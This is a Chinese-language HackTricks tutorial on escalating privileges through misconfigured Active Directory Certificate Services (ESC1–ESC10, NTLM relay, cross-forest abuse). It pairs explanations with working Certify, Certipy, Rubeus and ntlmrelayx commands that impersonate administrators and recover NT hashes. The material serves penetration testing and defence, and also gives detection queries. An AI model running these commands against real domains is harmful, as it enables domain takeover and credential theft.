# AD CS域提升

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**这是关于升级技术部分的摘要：**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 配置错误的证书模板 - ESC1

### 解释

### 解释配置错误的证书模板 - ESC1

* **企业CA授予低特权用户注册权限。**
* **不需要经理批准。**
* **不需要授权人员的签名。**
* **证书模板上的安全描述符过于宽松，允许低特权用户获取注册权限。**
* **证书模板配置为定义促进身份验证的EKU：**
* 包括扩展密钥用途（EKU）标识符，如客户端身份验证（OID 1.3.6.1.5.5.7.3.2）、PKINIT客户端身份验证（1.3.6.1.5.2.3.4）、智能卡登录（OID 1.3.6.1.4.1.311.20.2.2）、任何目的（OID 2.5.29.37.0）或无EKU（子CA）。
* **请求者可以在证书签名请求（CSR）中包含subjectAltName的能力是由模板允许的：**
* 如果存在，Active Directory（AD）会优先使用证书中的主体备用名称（SAN）进行身份验证。这意味着通过在CSR中指定SAN，可以请求证书以冒充任何用户（例如，域管理员）。请求者是否可以指定SAN在证书模板的AD对象中通过`mspki-certificate-name-flag`属性指示。此属性是一个位掩码，`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`标志的存在允许请求者指定SAN。

{% hint style="danger" %}
所述配置允许低特权用户请求具有任意选择的SAN的证书，从而通过Kerberos或SChannel进行任何域主体的身份验证。
{% endhint %}

有时启用此功能以支持产品或部署服务的即时生成HTTPS或主机证书，或由于缺乏理解。

值得注意的是，创建具有此选项的证书会触发警告，当复制现有证书模板（例如具有启用`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`的`WebServer`模板）然后修改以包括身份验证OID时，情况并非如此。

### 滥用

要**查找易受攻击的证书模板**，您可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**利用此漏洞冒充管理员**，可以运行：
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
然后，您可以将生成的**证书转换为`.pfx`**格式，并再次使用Rubeus或certipy进行**身份验证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows二进制文件"Certreq.exe"和"Certutil.exe"可用于生成PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以通过运行以下LDAP查询来枚举AD Forest配置模式中的证书模板，特别是那些不需要批准或签名，具有客户端身份验证或智能卡登录EKU，并启用了`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`标志。
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 错误配置的证书模板 - ESC2

### 解释

第二种滥用场景是第一种的变体：

1. 企业 CA 向低权限用户授予注册权限。
2. 禁用了经理批准的要求。
3. 省略了授权签名的需求。
4. 证书模板上的过于宽松的安全描述符授予了低权限用户的证书注册权限。
5. **证书模板被定义为包含 Any Purpose EKU 或没有 EKU。**

**Any Purpose EKU** 允许攻击者为**任何目的**获取证书，包括客户端认证、服务器认证、代码签名等。可以使用与 **ESC3** 相同的**技术**来利用这种情况。

没有 **EKUs** 的证书，作为下级 CA 证书，可以被滥用为**任何目的**，也可以**用于签署新证书**。因此，攻击者可以利用下级 CA 证书指定新证书中的任意 EKUs 或字段。

然而，为**域认证**创建的新证书如果下级 CA 未被 **`NTAuthCertificates`** 对象信任，则将无法正常工作，这是默认设置。尽管如此，攻击者仍然可以创建**具有任何 EKU 和任意证书值**的新证书。这些可能会被潜在地**滥用**于各种目的（例如代码签名、服务器认证等），并且可能对网络中的其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。

要枚举符合 AD Forest 配置模式中此场景的模板，可以运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置错误的注册代理模板 - ESC3

### 解释

这种情况类似于前两种，但是滥用了**不同的 EKU**（证书请求代理）和**2个不同的模板**（因此有2组要求）。

**证书请求代理 EKU**（OID 1.3.6.1.4.1.311.20.2.1），在微软文档中称为**注册代理**，允许主体**代表另一个用户**为**证书**进行**注册**。

**“注册代理”**在这样一个**模板**中注册，并使用生成的**证书共同签署代表其他用户的 CSR**。然后**发送**这个**共同签署的 CSR**给 CA，在允许“代表注册”的**模板**中注册，并且 CA 会回复一个**属于“其他”用户的证书**。

**要求 1:**

- 企业 CA 授予低权限用户注册权限。
- 不需要经理批准。
- 不需要授权签名。
- 证书模板的安全描述符过于宽松，授予低权限用户注册权限。
- 证书模板包含证书请求代理 EKU，允许代表其他主体请求其他证书模板。

**要求 2:**

- 企业 CA 授予低权限用户注册权限。
- 绕过经理批准。
- 模板的模式版本为 1 或超过 2，并指定了一个需要证书请求代理 EKU 的应用程序策略签发要求。
- 证书模板中定义的 EKU 允许域身份验证。
- CA 上未应用注册代理的限制。

### 滥用

您可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用这种情况：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**用户**被允许**获取****注册代理证书**的，注册代理被允许注册的模板，以及注册代理可以代表的**帐户**可以受到企业CA的限制。这是通过打开`certsrc.msc` **控制台**，**右键单击CA**，然后**单击属性**，然后导航到“注册代理”选项卡来实现的。

然而，值得注意的是，CA的**默认**设置是“**不限制注册代理**”。当管理员启用注册代理的限制时，将其设置为“限制注册代理”，默认配置仍然非常宽松。它允许**所有人**访问并在所有模板中注册。

## 可被利用的证书模板访问控制 - ESC4

### **解释**

**证书模板**上的**安全描述符**定义了特定**AD主体**对模板拥有的**权限**。

如果**攻击者**具有**修改****模板**并**实施**在**前几节**中概述的任何**可利用的配置错误**所需的**权限**，则可能促成特权升级。

适用于证书模板的显著权限包括：

- **所有者：**授予对对象的隐式控制，允许修改任何属性。
- **完全控制：**允许完全控制对象，包括修改任何属性的能力。
- **写入所有者：**允许将对象的所有者更改为攻击者控制下的主体。
- **写入Dacl：**允许调整访问控制，可能授予攻击者完全控制。
- **写入属性：**授权编辑任何对象属性。

### 滥用

类似于先前的特权升级的一个示例：

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4是指用户对证书模板具有写权限。例如，这可以被滥用以覆盖证书模板的配置，使模板容易受到ESC1的影响。

正如我们在上面的路径中所看到的，只有`JOHNPC`拥有这些权限，但我们的用户`JOHN`具有`AddKeyCredentialLink`边缘到`JOHNPC`的新权限。由于这个技术与证书有关，我也实施了这种攻击，这被称为[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。这里是Certipy的`shadow auto`命令的一个小窥视，用于检索受害者的NT哈希。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以使用一条命令覆盖证书模板的配置。默认情况下，Certipy会覆盖配置以使其容易受到ESC1的攻击。我们还可以指定`-save-old`参数来保存旧配置，这在攻击后恢复配置时会很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱的PKI对象访问控制 - ESC5

### 解释

相互连接的基于ACL的关系网络涵盖了除证书模板和证书颁发机构之外的多个对象，可能会影响整个AD CS系统的安全性。这些对象对安全性有重大影响，包括：

- CA服务器的AD计算机对象，可能会通过S4U2Self或S4U2Proxy等机制受到损害。
- CA服务器的RPC/DCOM服务器。
- 特定容器路径`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`内的任何后代AD对象或容器。该路径包括但不限于证书模板容器、证书颁发机构容器、NTAuthCertificates对象和Enrollment Services容器等容器和对象。

如果低权限攻击者设法控制这些关键组件中的任何一个，PKI系统的安全性可能会受到损害。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 解释

[CQure Academy文章](https://cqureacademy.com/blog/enhanced-key-usage)中讨论的主题也涉及到Microsoft概述的**`EDITF_ATTRIBUTESUBJECTALTNAME2`**标志的含义。当在证书颁发机构（CA）上激活此配置时，允许在**任何请求**的**主题备用名称**中包含**用户定义的值**，包括那些从Active Directory®构建的请求。因此，此配置允许**入侵者**通过为域**身份验证**设置的**任何模板**进行注册，特别是那些对**非特权用户**开放的用户模板。结果，可以获得一个证书，使入侵者能够作为域管理员或域内的**任何其他活动实体**进行身份验证。

**注意**：通过在`certreq.exe`中使用`-attrib "SAN:"`参数（称为“名称值对”）将**备用名称**附加到证书签名请求（CSR）的方法，与ESC1中对SAN的利用策略形成**对比**。这里的区别在于**帐户信息如何封装**—在证书属性中，而不是在扩展中。

### 滥用

要验证设置是否已激活，组织可以使用以下命令与`certutil.exe`：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
这个操作基本上使用了**远程注册表访问**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
工具如[**Certify**](https://github.com/GhostPack/Certify)和[**Certipy**](https://github.com/ly4k/Certipy)能够检测到这种错误配置并利用它：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要更改这些设置，假设拥有**域管理员**权限或等效权限，可以从任何工作站执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在您的环境中禁用此配置，可以使用以下命令删除标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
在 2022 年 5 月的安全更新之后，新发布的**证书**将包含一个**安全扩展**，其中包含了**请求者的 `objectSid` 属性**。对于 ESC1，此 SID 是从指定的 SAN 派生的。然而，对于**ESC6**，SID 反映了**请求者的 `objectSid`**，而不是 SAN。\
要利用 ESC6，系统必须容易受到 ESC10（弱证书映射）的影响，该映射将**SAN 优先于新的安全扩展**。
{% endhint %}

## 易受攻击的证书颁发机构访问控制 - ESC7

### 攻击 1

#### 解释

证书颁发机构的访问控制是通过一组权限来维护的，这些权限管理着 CA 的操作。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后导航到安全选项卡来查看这些权限。此外，可以使用 PSPKI 模块来枚举权限，例如：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这提供了关于主要权限的见解，即**`ManageCA`**和**`ManageCertificates`**，分别对应“CA管理员”和“证书管理员”的角色。

#### 滥用

在证书颁发机构上拥有**`ManageCA`**权限使主体能够使用PSPKI远程操纵设置。这包括切换**`EDITF_ATTRIBUTESUBJECTALTNAME2`**标志，以允许在任何模板中指定SAN，这是域提升的关键方面。

通过使用PSPKI的**Enable-PolicyModuleFlag** cmdlet，可以简化此过程，允许在没有直接GUI交互的情况下进行修改。

拥有**`ManageCertificates`**权限可促使批准待处理请求，有效地规避“CA证书管理员批准”保障。

**Certify**和**PSPKI**模块的结合可用于请求、批准和下载证书：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻击2

#### 解释

{% hint style="warning" %}
在**先前的攻击**中，使用了**`Manage CA`**权限来启用**EDITF\_ATTRIBUTESUBJECTALTNAME2**标志以执行**ESC6攻击**，但在CA服务（`CertSvc`）重新启动之前，这不会产生任何效果。当用户拥有`Manage CA`访问权限时，用户也被允许**重新启动服务**。然而，这**并不意味着用户可以远程重新启动服务**。此外，由于2022年5月的安全更新，**ESC6在大多数已打补丁的环境中可能无法直接使用**。
{% endhint %}

因此，这里提出另一种攻击方法。

先决条件：

- 仅具有**`ManageCA`权限**
- 具有**`Manage Certificates`**权限（可以从**`ManageCA`**授予）
- 必须**启用**证书模板**`SubCA`**（可以从**`ManageCA`**启用）

该技术依赖于具有`Manage CA`和`Manage Certificates`访问权限的用户可以**发出失败的证书请求**。**`SubCA`**证书模板**易受ESC1攻击**，但**只有管理员**可以在模板中注册。因此，**用户**可以**请求**注册**`SubCA`** - 将被**拒绝** - 但**然后由管理员发放**。

#### 滥用

您可以通过将您的用户添加为新的官员来**授予自己`Manage Certificates`**访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以使用 `-enable-template` 参数在 CA 上启用。默认情况下，`SubCA` 模板已启用。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已经满足了这次攻击的先决条件，我们可以开始通过**基于`SubCA`模板请求证书**。

**这个请求将被拒绝**，但我们会保存私钥并记录请求ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
通过我们的 **`Manage CA` 和 `Manage Certificates`**，然后我们可以使用 `ca` 命令和 `-issue-request <request ID>` 参数来 **发出失败的证书** 请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用`req`命令和`-retrieve <request ID>`参数**检索已发放的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 解释

{% hint style="info" %}
在安装了**AD CS**的环境中，如果存在一个**易受攻击的网络注册端点**，并且至少发布了一个允许**域计算机注册和客户端认证**的**证书模板**（例如默认的**`Machine`**模板），那么**任何启用了 spooler 服务的计算机都有可能被攻击者入侵**！
{% endhint %}

AD CS支持几种基于HTTP的注册方法，通过管理员安装的附加服务器角色提供。这些基于HTTP的证书注册接口容易受到**NTLM中继攻击**的影响。攻击者可以从**受攻击的计算机上**冒充通过入站NTLM进行身份验证的**任何AD帐户**。在冒充受害者帐户的同时，攻击者可以访问这些Web接口，**使用`User`或`Machine`证书模板请求客户端认证证书**。

* **网络注册接口**（位于`http://<caserver>/certsrv/`的旧版ASP应用程序）默认仅支持HTTP，不提供对NTLM中继攻击的保护。此外，它明确通过其授权HTTP标头仅允许NTLM身份验证，使更安全的身份验证方法如Kerberos无法应用。
* **证书注册服务**（CES）、**证书注册策略**（CEP）Web服务和**网络设备注册服务**（NDES）默认支持通过其授权HTTP标头进行协商身份验证。协商身份验证**同时支持**Kerberos和**NTLM**，允许攻击者在中继攻击期间**降级到NTLM**身份验证。尽管这些Web服务默认启用HTTPS，但仅使用HTTPS**无法防范NTLM中继攻击**。对于HTTPS服务，防范NTLM中继攻击只有在HTTPS与通道绑定结合时才可能。遗憾的是，AD CS未在IIS上激活扩展保护以进行身份验证，这是通道绑定所必需的。

NTLM中继攻击的一个常见**问题**是**NTLM会话的短暂持续时间**以及攻击者无法与**需要NTLM签名**的服务进行交互。

然而，通过利用NTLM中继攻击获取用户证书可以克服这一限制，因为证书的有效期决定了会话的持续时间，并且证书可以与**要求NTLM签名**的服务一起使用。有关使用窃取的证书的说明，请参阅：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM中继攻击的另一个限制是**攻击者控制的计算机必须由受害者帐户进行身份验证**。攻击者可以等待或尝试**强制**进行此身份验证：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **滥用**

[**Certify**](https://github.com/GhostPack/Certify)的`cas`列举了**已启用的HTTP AD CS端点**：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers`属性用于企业证书颁发机构（CAs）存储证书颁发服务（CES）端点。可以使用工具**Certutil.exe**解析和列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### 滥用证书
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 利用 [Certipy](https://github.com/ly4k/Certipy)

Certipy默认根据帐户名称是否以`$`结尾来基于`Machine`或`User`模板发出证书请求。可以通过使用`-template`参数来指定替代模板。

然后可以使用类似 [PetitPotam](https://github.com/ly4k/PetitPotam) 的技术来强制进行身份验证。在处理域控制器时，需要指定`-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#5485" id="5485"></a>

### 解释

新值 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 用于 **`msPKI-Enrollment-Flag`** 的 ESC9，阻止在证书中嵌入 **新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展**。当 `StrongCertificateBindingEnforcement` 设置为 `1` 时（默认设置），与设置为 `2` 相对应，此标志变得重要起来。在较弱的证书映射（如 ESC10）可能被利用的情况下，其重要性会增加，因为缺少 ESC9 不会改变要求。

设置此标志变得重要的条件包括：
- `StrongCertificateBindingEnforcement` 未调整为 `2`（默认为 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
- 证书在 `msPKI-Enrollment-Flag` 设置中标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任何客户端身份验证 EKU。
- 可以通过任何帐户获得 `GenericWrite` 权限以妥协另一个帐户。

### 滥用场景

假设 `John@corp.local` 拥有对 `Jane@corp.local` 的 `GenericWrite` 权限，目标是妥协 `Administrator@corp.local`。`Jane@corp.local` 被允许注册的 `ESC9` 证书模板在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

最初，通过使用 `John` 的 `GenericWrite` 获得 `Jane` 的哈希值：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，有意省略了 `@corp.local` 域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
这种修改不违反约束条件，因为 `Administrator@corp.local` 作为 `Administrator` 的 `userPrincipalName` 保持不变。

随后，将以 `Jane` 的身份请求标记为易受攻击的 `ESC9` 证书模板：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
据指出，证书的 `userPrincipalName` 反映了 `Administrator`，没有任何“object SID”。

然后将 `Jane` 的 `userPrincipalName` 恢复为她的原始名称 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
尝试使用颁发的证书进行身份验证现在会产生`Administrator@corp.local`的NT哈希。由于证书缺乏域规范，命令必须包括`-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱证书映射 - ESC10

### 解释

域控制器上的两个注册表键值被 ESC10 提及：

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下 `CertificateMappingMethods` 的默认值为 `0x18` (`0x8 | 0x10`), 先前设置为 `0x1F`.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下 `StrongCertificateBindingEnforcement` 的默认设置为 `1`, 先前为 `0`.

**情况 1**

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。

**情况 2**

如果 `CertificateMappingMethods` 包括 `UPN` 位 (`0x4`)。

### 滥用案例 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的帐户 A 可被利用来危害任何帐户 B。

例如，拥有对 `Jane@corp.local` 的 `GenericWrite` 权限，攻击者旨在危害 `Administrator@corp.local`。该过程与 ESC9 相似，允许利用任何证书模板。

首先，使用 Shadow Credentials 获取 `Jane` 的哈希，利用 `GenericWrite`。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，`Jane` 的 `userPrincipalName` 被更改为 `Administrator`，故意省略了 `@corp.local` 部分，以避免违反约束。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
接下来，将以`Jane`的身份请求启用客户端认证的证书，使用默认的`User`模板。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`的`userPrincipalName`然后被恢复为其原始值`Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获得的证书进行身份验证将产生`Administrator@corp.local`的NT哈希，由于证书中缺少域详细信息，因此需要在命令中指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用案例 2

当`CertificateMappingMethods`包含`UPN`位标志(`0x4`)时，具有`GenericWrite`权限的帐户A可以妥协任何缺少`userPrincipalName`属性的帐户B，包括机器帐户和内置域管理员`Administrator`。

在这里，目标是通过获取`Jane`的哈希值来妥协`DC$@corp.local`，利用`GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`的`userPrincipalName`然后设置为`DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
一个用默认的`User`模板请求`Jane`作为客户端认证的证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`的`userPrincipalName`在此过程后被恢复为原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
要通过Schannel进行身份验证，使用Certipy的`-ldap-shell`选项，指示身份验证成功为`u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过LDAP shell，诸如 `set_rbcd` 的命令可以启用基于资源的受限委派（RBCD）攻击，可能危及域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
## 通过证书解释被动语态下的森林入侵

### 通过受损CA破坏森林信任

**跨森林注册**的配置相对简单。资源森林中的**根CA证书**由管理员**发布到账户森林**，并且资源森林中的**企业CA证书**被**添加到每个账户森林中的`NTAuthCertificates`和AIA容器**中。澄清一下，这种安排赋予了资源森林中的**CA对其管理的所有其他森林完全控制**。如果此CA被攻击者**破坏**，则它们可以**伪造资源和账户森林中所有用户的证书**，从而打破森林的安全边界。

### 授予外部主体的注册特权

在多森林环境中，需要谨慎处理**发布证书模板**的企业CA，这些模板允许**经过身份验证的用户或外部主体**（属于企业CA所属森林之外的用户/组）**注册和编辑权限**。\
通过跨域认证，AD会将**经过身份验证的用户SID**添加到用户的令牌中。因此，如果一个域拥有一个允许**经过身份验证的用户注册权限**的企业CA模板，那么来自不同森林的用户可能会**注册该模板**。同样，如果**模板明确授予外部主体注册权限**，则会创建一个**跨森林访问控制关系**，使一个森林中的主体能够**注册另一个森林中的模板**。

这两种情况都会导致从一个森林到另一个森林的**攻击面增加**。攻击者可以利用证书模板的设置在外部域中获取额外权限。
